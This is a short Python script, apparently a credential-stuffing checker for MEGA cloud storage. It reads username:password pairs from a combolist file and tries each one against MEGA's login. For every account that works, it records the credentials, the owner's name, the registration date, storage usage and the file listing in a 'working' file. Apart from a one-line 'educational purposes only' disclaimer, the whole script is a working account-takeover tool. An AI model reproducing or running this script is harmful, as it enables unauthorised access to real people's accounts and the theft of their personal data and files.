import requests
from datetime import datetime
from mega import Mega
from termcolor import colored

URL = "https://hastebin.com/raw/oliriboyar"

contents = requests.get(URL).text
print(colored(contents,'magenta') + "\n")
print("Disclaimer: This software is for educational purposes only.\n")

print("Result: ")
mega = Mega()
a = open("combolist.txt","r")
file = [s.rstrip() for s in a.readlines()]
for lines in file:
    combo = lines.split(":")
    param={
        "username":combo[0],
        "password":combo[1]
    }
    try:
        m = mega.login(param['username'], param['password'])
        account = param['username'], param['password']
        info = m.get_files()
        details = m.get_user()
        timestamp_details = datetime.fromtimestamp(details['since'], tz=None)
        space = m.get_storage_space(giga=True)
        used = f"{space['used']:.2}"
        green = open("working.txt","a",encoding="utf-8")
        green.write(f"\nAccount:{account[0]}:{account[1]}\nDetails:\n- Name: {details['name']}\n- Lastname: {details['lastname']}\n- Registration date: {timestamp_details}\n- Size: {used}GB / {space['total']}GB\nFiles: {info}\n")
        green.close()
        print(colored(f"[V] {account[0]}:{account[1]}","green",attrs=["bold"]))
    except:
        print(colored(f"[X] " + param['username'] + ":" + param['password'], "red",attrs=["bold"]))

    read = open("working.txt","r")
